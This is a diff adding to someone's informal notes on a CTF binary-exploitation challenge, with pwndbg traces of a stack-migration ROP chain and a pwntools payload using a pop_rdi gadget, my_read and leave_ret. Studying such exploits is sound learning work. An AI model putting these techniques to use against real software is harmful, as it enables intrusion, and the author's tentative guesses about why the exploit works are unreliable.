@@ -205,3 +205,107 @@ So i was just testing if
 ```
 in this case would somehow work while not giving anything as 2nd argument (indeed it worked somehow lol, I guess i am lucky that some random and suitable value on stack goes into `rdi`. I would check check pwndbg on that later) 
 
+
+
+
+What is normally read into `my_read` or `read`:
+```
+   0x40084e <my_read+12>                          mov    qword ptr [rbp - 0x10], rsi     [0x7ffec06c0b60] <= 0x60
+   0x400852 <my_read+16>                          mov    rdx, qword ptr [rbp - 0x10]     RDX, [0x7ffec06c0b60] => 0x60
+   0x400856 <my_read+20>                          mov    rax, qword ptr [rbp - 8]        RAX, [0x7ffec06c0b68] => 0x7ffec06c0b80 —▸ 0x401138 ◂— and byte ptr [r8 + rbp*2 + 0x69], sil /* 'I think I need to reduce the strength of my writin...' */
+   0x40085a <my_read+24>                          mov    rsi, rax                        RSI => 0x7ffec06c0b80 —▸ 0x401138 ◂— and byte ptr [r8 + rbp*2 + 0x69], sil /* 'I think I need to reduce the strength of my writin...' */
+   0x40085d <my_read+27>                          mov    edi, 0                          EDI => 0
+ ► 0x400862 <my_read+32>                          call   read@plt                    <read@plt>
+        fd: 0 (pipe:[374499])
+        buf: 0x7ffec06c0b80 —▸ 0x401138 ◂— and byte ptr [r8 + rbp*2 + 0x69], sil /* 'I think I need to reduce the strength of my writing...' */
+        nbytes: 0x60
+```
+
+We can see that the `nbytes` i.e. that size of input is equal to 0x60
+
+BUt in my solution
+```
+   0x40084e <my_read+12>                          mov    qword ptr [rbp - 0x10], rsi     [0x7ffec06c0bb8] <= 0x7ffec06c0b80 ◂— '111111111111111111111111111111111111111111111111 %...'
+   0x400852 <my_read+16>                          mov    rdx, qword ptr [rbp - 0x10]     RDX, [0x7ffec06c0bb8] => 0x7ffec06c0b80 ◂— '111111111111111111111111111111111111111111111111 %...'
+   0x400856 <my_read+20>                          mov    rax, qword ptr [rbp - 8]        RAX, [0x7ffec06c0bc0] => 0x602520 ◂— 0
+   0x40085a <my_read+24>                          mov    rsi, rax                        RSI => 0x602520 ◂— 0
+   0x40085d <my_read+27>                          mov    edi, 0                          EDI => 0
+ ► 0x400862 <my_read+32>                          call   read@plt                    <read@plt>
+        fd: 0 (pipe:[374499])
+        buf: 0x602520 ◂— 0
+        nbytes: 0x7ffec06c0b80 ◂— '111111111111111111111111111111111111111111111111 %`'
+```
+a byte string (?) ending with weird `%` goes in(?)
+
+I am very curious on why this would work lol 
+
+so i was taking a shit, got into a bit obsessed in fantasizing a conversation with sammy, kinda forgot what I have been doing here and lost interest early lol 
+
+> I am very curious on why this would work lol 
+
+i need to deliberately think about CTF, pwn stuff obsessively I feel like 
+
+chat gpt said that `nbytes: 0x7ffec06c0b80 ◂— '111111111111111111111111111111111111111111111111 %` worked probably because it is interpreting the memory address as a very large integer as its size paramter. It is like using the pointers' numeric value as size
+
+> This is a good example of how type confusion in low-level programming can sometimes be exploited!
+
+
+
+
+
+
+
+# what is this 
+```
+   0x400869 <my_read+39>         ret                                <puts@got[plt]>
+    ↓
+   0x400868 <my_read+38>         leave  
+   0x400869 <my_read+39>         ret                                <puts@got[plt]>
+    ↓
+   0x400868 <my_read+38>         leave  
+   0x400869 <my_read+39>         ret                                <puts@got[plt]>
+    ↓
+ ► 0x400868 <my_read+38>         leave  
+   0x400869 <my_read+39>         ret                                <my_read+38>
+    ↓
+   0x400868 <my_read+38>         leave  
+   0x400869 <my_read+39>         ret                                <puts@got[plt]>
+    ↓
+   0x601fc8 <puts@got[plt]>      jo     printf@got[plt]+3           <printf@got[plt]+3>
+ 
+   0x601fca <puts@got[plt]+2>    sub    byte ptr [rbx + 0x7f0c], bh
+```
+the above is commonly seen in stack migration
+which happens after the `my_read` here 
+```
+payload1 = flat(
+    # 96 bytes to write in this payload 
+    b'1' * 0x30,    # padding to rbp, 48 bytes, 6 more lines to go
+    buf1,           # rbp of next stack frame
+
+    # preparing and moving to the next frame 
+    pop_rdi_ret,
+    buf1,
+    elf.sym['my_read'], # see whats rsi
+
+    leave_ret
+)
+```
+
+## discovery 
+```
+   0x4008af <leave_messages_with_great_care+69>    mov    dword ptr [rip + 0x201793], 1     [collapsed] <= 1
+   0x4008b9 <leave_messages_with_great_care+79>    nop    
+ ► 0x4008ba <leave_messages_with_great_care+80>    leave  
+   0x4008bb <leave_messages_with_great_care+81>    ret                                <__libc_csu_init+99>
+
+```
+I noticed that the program always first go into a functionc alled __libc_csu_init in stack migration before those reading functions
+
+```
+   0x4008bb <leave_messages_with_great_care+81>    ret                                <__libc_csu_init+99>
+    ↓
+ ► 0x400a33 <__libc_csu_init+99>                   pop    rdi     RDI => 0x602520
+   0x400a34 <__libc_csu_init+100>                  ret                                <my_read>
+```
+it seems to be somewhere for the gadgets 
